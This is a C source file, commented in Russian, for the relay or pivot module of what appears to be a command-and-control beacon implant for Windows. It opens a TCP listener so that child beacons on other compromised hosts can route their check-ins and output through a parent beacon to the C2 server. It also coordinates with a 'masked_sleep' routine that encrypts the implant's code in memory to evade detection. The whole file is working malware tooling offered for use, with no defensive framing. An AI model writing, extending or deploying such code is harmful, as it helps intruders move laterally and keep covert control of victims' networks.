// cmd_relay.c — цепочный пивот: дочерний бикон → родительский → C2
//
// Родительский бикон открывает TCP-порт; дочерние биконы подключаются
// к нему и общаются с C2-сервером через родителя.
//
//   OP_RELAY_START {port u32}
//       Открыть TCP listener; каждый принятый клиент — дочерний бикон.
//
//   OP_RELAY_STOP  {port u32}
//       Закрыть listener и все дочерние соединения на этом порту.
//
//   OP_RELAY_RESP  {child_uid u32, data bytes}
//       Записать data в сокет указанного дочернего бикона.
//       data — полный raw TCP-кадр [u32 total BE][u8 type][payload].
//
// Формат relay-кадра (task_id = RELAY_TASK_MAGIC, отправляется серверу):
//   [u32 child_uid BE][u8 tport_type][payload...]
//   tport_type совпадает с TPORT_CHECKIN / TPORT_POLL / TPORT_OUTPUT.
//
// Дочерние соединения обслуживаются фоновыми потоками (relay_child_thread).
// Они читают TCP-кадры от дочерних биконов и кладут их в relay_out_queue_.
// Основной цикл вызывает relay_flush_pending(), которая опустошает очередь
// через transport_direct_send().
//
// Синхронизация с masked_sleep:
//   Перед masked_sleep основной поток вызывает relay_suspend_threads(),
//   после — relay_resume_threads(). Пока .text зашифрован, relay-потоки
//   приостановлены и не могут выполнять никакой код.

#include <winsock2.h>
#include <ws2tcpip.h>
#include "../core/beacon.h"

// ---- константы -----------------------------------------------------------

#define RELAY_CHILD_MAX  8    // макс. одновременных дочерних биконов
#define RELAY_OUT_MAX    128  // глубина очереди исходящих кадров
#define RELAY_FRAME_MAX  (2u * 1024u * 1024u)  // 2 МБ — макс. TCP-кадр

// ---- типы ----------------------------------------------------------------

typedef struct {
    volatile LONG active;        // 1 = слот занят
    uint32_t      child_uid;     // случайный идентификатор дочернего бикона
    SOCKET        sock;          // TCP-сокет дочернего бикона
    HANDLE        thread;        // поток relay_child_thread
    volatile LONG frame_logged;  // 1 после первого залогированного кадра
} RelayChild;

typedef struct {
    uint8_t* buf;  // указатель на выделенный буфер ([u32 uid][u8 type][payload])
    uint32_t len;
} RelayOutEntry;

// ---- глобальное состояние ------------------------------------------------

static RelayChild     g_relay_children[RELAY_CHILD_MAX];
static SOCKET         g_relay_lsock   = INVALID_SOCKET;
static HANDLE         g_relay_lthread = NULL;
static volatile LONG  g_relay_running = 0;
static LONG           g_relay_inited  = 0;

static CRITICAL_SECTION g_relay_cs;
static LONG             g_relay_cs_inited = 0;
static RelayOutEntry    g_relay_out[RELAY_OUT_MAX];
static int              g_relay_out_head = 0;
static int              g_relay_out_tail = 0;

// ---- Диагностический лог (флашится через основной цикл) -------------------
// Relay-потоки пишут сюда под g_relay_cs; relay_flush_pending читает и
// выводит через bdbg() в beacon.log оператора.
#define RELAY_DIAG_CAP 1024
static char   g_relay_diag[RELAY_DIAG_CAP];
static size_t g_relay_diag_len = 0;

// ---- инициализация -------------------------------------------------------

static void relay_init(void) {
    if (InterlockedCompareExchange(&g_relay_inited, 1, 0) == 0) {
        for (int i = 0; i < RELAY_CHILD_MAX; i++) {
            g_relay_children[i].active       = 0;
            g_relay_children[i].child_uid    = 0;
            g_relay_children[i].sock         = INVALID_SOCKET;
            g_relay_children[i].thread       = NULL;
            g_relay_children[i].frame_logged = 0;
        }
    }
    if (InterlockedCompareExchange(&g_relay_cs_inited, 1, 0) == 0) {
        InitializeCriticalSection(&g_relay_cs);
    }
}

// ---- вспомогательные функции диагностического лога ----------------------
// Вызываются ТОЛЬКО под g_relay_cs.

static void relay_diag_push(const char* s) {
    size_t n = rt_strlen(s);
    if (g_relay_diag_len + n < RELAY_DIAG_CAP) {
        rt_memcpy(g_relay_diag + g_relay_diag_len, s, n);
        g_relay_diag_len += n;
    }
}

static void relay_diag_push_u32(uint32_t v) {
    char tmp[12]; int n = 0;
    if (!v) { relay_diag_push("0"); return; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    for (int i = 0, j = n - 1; i < j; i++, j--) {
        char c = tmp[i]; tmp[i] = tmp[j]; tmp[j] = c;
    }
    tmp[n] = 0;
    relay_diag_push(tmp);
}

// ---- постановка кадра в очередь ------------------------------------------

static void relay_enqueue(uint8_t* buf, uint32_t len) {
    EnterCriticalSection(&g_relay_cs);
    int next = (g_relay_out_tail + 1) % RELAY_OUT_MAX;
    if (next != g_relay_out_head) {
        g_relay_out[g_relay_out_tail].buf = buf;
        g_relay_out[g_relay_out_tail].len = len;
        g_relay_out_tail = next;
    } else {
        // Очередь переполнена — кадр отбрасывается.
        bfree(buf);
    }
    LeaveCriticalSection(&g_relay_cs);
}

// ---- поток обслуживания дочернего бикона ---------------------------------

static DWORD WINAPI relay_child_thread(LPVOID arg) {
    RelayChild* c = (RelayChild*)arg;

    while (InterlockedCompareExchange(&c->active, 1, 1)) {
        // Читаем заголовок TCP-кадра: [u32 total BE][u8 type].
        uint8_t hdr[5];
        int got = 0;
        while (got < 5) {
            int r = recv(c->sock, (char*)hdr + got, 5 - got, 0);
            if (r <= 0) goto done;
            got += r;
        }
        uint32_t total =
            ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
            ((uint32_t)hdr[2] <<  8) |  (uint32_t)hdr[3];
        if (total < 1 || total > RELAY_FRAME_MAX) goto done;
        uint8_t  ttype    = hdr[4];
        uint32_t body_len = total - 1;

        // Логируем первый кадр от этого дочернего бикона.
        if (InterlockedCompareExchange(&c->frame_logged, 1, 0) == 0) {
            EnterCriticalSection(&g_relay_cs);
            relay_diag_push("[relay] first frame type=");
            relay_diag_push_u32((uint32_t)ttype);
            relay_diag_push(" uid=");
            relay_diag_push_u32(c->child_uid);
            relay_diag_push("\n");
            LeaveCriticalSection(&g_relay_cs);
        }

        // Формируем relay-запись: [u32 child_uid BE][u8 ttype][body...]
        uint32_t entry_len = 5u + body_len;  // 4(uid) + 1(type) + body
        uint8_t* entry = (uint8_t*)bmalloc(entry_len);
        if (!entry) goto done;

        entry[0] = (uint8_t)(c->child_uid >> 24);
        entry[1] = (uint8_t)(c->child_uid >> 16);
        entry[2] = (uint8_t)(c->child_uid >>  8);
        entry[3] = (uint8_t)(c->child_uid);
        entry[4] = ttype;

        // Читаем тело кадра.
        uint32_t brecv = 0;
        while (brecv < body_len) {
            int r = recv(c->sock, (char*)entry + 5 + brecv,
                         (int)(body_len - brecv), 0);
            if (r <= 0) { bfree(entry); goto done; }
            brecv += (uint32_t)r;
        }

        relay_enqueue(entry, entry_len);
    }
done:
    InterlockedExchange(&c->active, 0);
    return 0;
}

// ---- поток приёма новых дочерних биконов ---------------------------------

static DWORD WINAPI relay_accept_thread(LPVOID arg) {
    (void)arg;

    while (InterlockedCompareExchange(&g_relay_running, 1, 1)) {
        struct sockaddr_in cli;
        int csz = sizeof(cli);
        SOCKET s = accept(g_relay_lsock, (struct sockaddr*)&cli, &csz);
        if (s == INVALID_SOCKET) break;

        // Найти свободный слот.
        int slot = -1;
        for (int i = 0; i < RELAY_CHILD_MAX; i++) {
            if (InterlockedCompareExchange(&g_relay_children[i].active, 1, 0) == 0) {
                slot = i;
                break;
            }
        }
        if (slot < 0) { closesocket(s); continue; }

        // Случайный child_uid через штатный bc_random.
        uint32_t uid = 0;
        bc_random((uint8_t*)&uid, sizeof(uid));

        g_relay_children[slot].child_uid    = uid;
        g_relay_children[slot].sock         = s;
        g_relay_children[slot].frame_logged = 0;

        // Логируем подключение нового дочернего бикона.
        EnterCriticalSection(&g_relay_cs);
        relay_diag_push("[relay] child connected uid=");
        relay_diag_push_u32(uid);
        relay_diag_push("\n");
        LeaveCriticalSection(&g_relay_cs);

        HANDLE h = CreateThread(NULL, 0, relay_child_thread,
                                &g_relay_children[slot], 0, NULL);
        if (!h) {
            closesocket(s);
            g_relay_children[slot].sock = INVALID_SOCKET;
            InterlockedExchange(&g_relay_children[slot].active, 0);
        } else {
            g_relay_children[slot].thread = h;
        }
    }
    InterlockedExchange(&g_relay_running, 0);
    return 0;
}

// ---- обработчики команд --------------------------------------------------

// Форматирует порт в строку вида "relay listener started on port NNNNN\n".
static void relay_msg(const BeaconTask* t, const char* prefix, uint32_t port) {
    out_begin(t->id, RESP_OUTPUT);
    out_write(prefix, rt_strlen(prefix));
    if (port) {
        char ps[8]; int n = 0;
        uint32_t v = port;
        char tmp[8]; int m = 0;
        while (v) { tmp[m++] = (char)('0' + v % 10); v /= 10; }
        while (m) ps[n++] = tmp[--m];
        out_write(ps, (size_t)n);
    }
    out_write("\n", 1);
}

// OP_RELAY_START: открыть TCP listener.
void cmd_relay_start(const BeaconTask* t) {
    relay_init();

    uint32_t port = 0;
    kv_get_u32(t->pay, t->pay_len, "port", &port);
    if (!port) {
        relay_msg(t, "[relay] bad port\n", 0);
        return;
    }

    if (InterlockedCompareExchange(&g_relay_running, 1, 0) != 0) {
        relay_msg(t, "[relay] already running on port ", port);
        return;
    }

    // WSAStartup.
    static LONG s_wsa = 0;
    if (InterlockedCompareExchange(&s_wsa, 1, 0) == 0) {
        WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    }

    SOCKET ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls == INVALID_SOCKET) {
        InterlockedExchange(&g_relay_running, 0);
        return;
    }
    BOOL reuse = TRUE;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

    struct sockaddr_in addr;
    rt_memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((u_short)port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(ls, (struct sockaddr*)&addr, sizeof(addr)) != 0 ||
        listen(ls, RELAY_CHILD_MAX) != 0) {
        closesocket(ls);
        InterlockedExchange(&g_relay_running, 0);
        bdbg("[relay] bind/listen failed\n");
        relay_msg(t, "[relay] bind/listen failed on port ", port);
        return;
    }
    g_relay_lsock = ls;

    HANDLE h = CreateThread(NULL, 0, relay_accept_thread, NULL, 0, NULL);
    if (!h) {
        closesocket(ls);
        g_relay_lsock = INVALID_SOCKET;
        InterlockedExchange(&g_relay_running, 0);
        bdbg("[relay] CreateThread failed\n");
        relay_msg(t, "[relay] CreateThread failed, port ", port);
    } else {
        g_relay_lthread = h;
        bdbg("[relay] listener started\n");
        relay_msg(t, "[relay] listener started on port ", port);
    }
}

// OP_RELAY_STOP: закрыть listener и все дочерние соединения.
void cmd_relay_stop(const BeaconTask* t) {
    relay_init();
    InterlockedExchange(&g_relay_running, 0);
    if (g_relay_lsock != INVALID_SOCKET) {
        closesocket(g_relay_lsock);
        g_relay_lsock = INVALID_SOCKET;
    }
    for (int i = 0; i < RELAY_CHILD_MAX; i++) {
        if (g_relay_children[i].active && g_relay_children[i].sock != INVALID_SOCKET) {
            closesocket(g_relay_children[i].sock);
            g_relay_children[i].sock = INVALID_SOCKET;
        }
        InterlockedExchange(&g_relay_children[i].active, 0);
    }
    relay_msg(t, "[relay] stopped\n", 0);
}

// OP_RELAY_RESP: записать raw TCP-кадр в сокет дочернего бикона.
void cmd_relay_resp(const BeaconTask* t) {
    relay_init();
    uint32_t child_uid = 0;
    kv_get_u32(t->pay, t->pay_len, "child_uid", &child_uid);
    const uint8_t* data = NULL; uint32_t dlen = 0;
    kv_find(t->pay, t->pay_len, "data", &data, &dlen);
    if (!data || !dlen) return;

    for (int i = 0; i < RELAY_CHILD_MAX; i++) {
        if (!g_relay_children[i].active) continue;
        if (g_relay_children[i].child_uid != child_uid) continue;
        SOCKET s = g_relay_children[i].sock;
        if (s == INVALID_SOCKET) return;
        // Записываем полный кадр [u32 total BE][u8 type][payload] в сокет дочернего.
        int sent = 0;
        while (sent < (int)dlen) {
            int r = send(s, (const char*)data + sent, (int)(dlen - sent), 0);
            if (r <= 0) {
                closesocket(s);
                g_relay_children[i].sock = INVALID_SOCKET;
                InterlockedExchange(&g_relay_children[i].active, 0);
                break;
            }
            sent += r;
        }
        return;
    }
}

// ---- приостановка / возобновление relay-потоков -------------------------
// Вызывается из основного цикла вокруг masked_sleep: потоки не могут
// выполнять код из .text пока тот зашифрован.

void relay_suspend_threads(void) {
    if (!g_relay_lthread) return;  // relay не запущен
    SuspendThread(g_relay_lthread);
    for (int i = 0; i < RELAY_CHILD_MAX; i++) {
        if (InterlockedCompareExchange(&g_relay_children[i].active, 1, 1) &&
            g_relay_children[i].thread) {
            SuspendThread(g_relay_children[i].thread);
        }
    }
}

void relay_resume_threads(void) {
    if (!g_relay_lthread) return;
    ResumeThread(g_relay_lthread);
    for (int i = 0; i < RELAY_CHILD_MAX; i++) {
        if (InterlockedCompareExchange(&g_relay_children[i].active, 1, 1) &&
            g_relay_children[i].thread) {
            ResumeThread(g_relay_children[i].thread);
        }
    }
}

// ---- периодическая отправка накопленных relay-кадров ---------------------

void relay_flush_pending(const TransportVtbl* t) {
    if (!g_relay_cs_inited) return;

    // Выводим диагностические сообщения из relay-потоков в beacon.log.
    {
        char diag[RELAY_DIAG_CAP + 1];
        size_t dlen = 0;
        EnterCriticalSection(&g_relay_cs);
        dlen = g_relay_diag_len;
        if (dlen) {
            rt_memcpy(diag, g_relay_diag, dlen);
            g_relay_diag_len = 0;
        }
        LeaveCriticalSection(&g_relay_cs);
        if (dlen) {
            diag[dlen] = 0;
            bdbg(diag);
        }
    }

    for (;;) {
        RelayOutEntry entry;
        EnterCriticalSection(&g_relay_cs);
        if (g_relay_out_head == g_relay_out_tail) {
            LeaveCriticalSection(&g_relay_cs);
            break;
        }
        entry = g_relay_out[g_relay_out_head];
        g_relay_out_head = (g_relay_out_head + 1) % RELAY_OUT_MAX;
        LeaveCriticalSection(&g_relay_cs);

        transport_direct_send(t, RELAY_TASK_MAGIC, entry.buf, entry.len);
        bfree(entry.buf);
    }
}
